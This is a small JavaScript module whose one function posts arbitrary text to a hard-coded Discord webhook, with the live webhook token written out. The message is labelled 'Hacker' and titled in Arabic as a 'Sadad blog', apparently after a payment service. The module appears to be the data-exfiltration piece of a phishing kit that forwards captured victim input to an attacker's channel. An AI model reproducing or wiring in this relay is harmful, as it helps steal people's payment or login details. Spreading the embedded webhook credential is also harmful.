import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1325927501863587890/v1YAc-FtTNOpPBMSmhQICSGqLjvnVzpz3dftckpX1wnk-FXN1CztNgqn7aaWkc56lck-",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
